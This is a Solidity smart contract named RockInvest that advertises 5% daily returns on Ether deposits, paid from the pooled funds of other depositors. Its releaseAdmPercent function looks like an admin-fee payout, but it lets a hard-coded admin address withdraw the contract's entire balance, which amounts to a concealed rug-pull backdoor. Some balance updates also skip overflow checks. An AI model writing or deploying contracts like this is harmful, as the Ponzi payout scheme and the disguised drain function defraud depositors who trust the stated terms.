1 pragma solidity ^0.4.25;
2  
3 library SafeMath {
4   function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
5     if (_a == 0) {
6       return 0;
7     }
8     c = _a * _b;
9     assert(c / _a == _b);
10     return c;
11   }
12  
13   function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
14     return _a / _b;
15   }
16  
17   function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
18     assert(_b <= _a);
19     return _a - _b;
20   }
21  
22   function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
23     c = _a + _b;
24     assert(c >= _a);
25     return c;
26   }
27 }
28  
29    
30 contract RockInvest {
31     using SafeMath for uint256;
32    
33    
34     address public constant admAddress = 0x35F55eBE0CAABaA7D0Ed7E6f4DbA414DF76EC4c4;
35     
36     mapping (address => uint256) deposited;
37     mapping (address => uint256) withdrew;
38     mapping (address => uint256) blocklock;
39  
40     uint256 public totalDepositedWei = 0;
41     uint256 public totalWithdrewWei = 0;
42     modifier admPercent(){
43         require(msg.sender == admAddress);
44         _;
45     }
46  
47     function() payable external {
48         if (deposited[msg.sender] != 0) {
49             address investor = msg.sender;
50             uint256 depositsPercents = deposited[msg.sender].mul(5).div(100).mul(block.number-blocklock[msg.sender]).div(5900);
51             investor.transfer(depositsPercents);
52  
53             withdrew[msg.sender] += depositsPercents;
54             totalWithdrewWei = totalWithdrewWei.add(depositsPercents);
55 			
56 			
57         }
58  
59        
60         blocklock[msg.sender] = block.number;
61         deposited[msg.sender] += msg.value;
62  
63         totalDepositedWei = totalDepositedWei.add(msg.value);
64     }
65  
66     function userDepositedWei(address _address) public view returns (uint256) {
67         return deposited[_address];
68     }
69  
70     function userWithdrewWei(address _address) public view returns (uint256) {
71         return withdrew[_address];
72     }
73  
74     function userDividendsWei(address _address) public view returns (uint256) {
75         return deposited[_address].mul(5).div(100).mul(block.number-blocklock[_address]).div(5900);
76     }
77    
78     function releaseAdmPercent() admPercent public {
79         uint256 toParticipants = this.balance;
80         admAddress.transfer(toParticipants);
81     }
82  
83  
84    
85     function bytesToAddress(bytes bys) private pure returns (address addr) {
86         assembly {
87             addr := mload(add(bys, 20))
88         }
89     }
90 }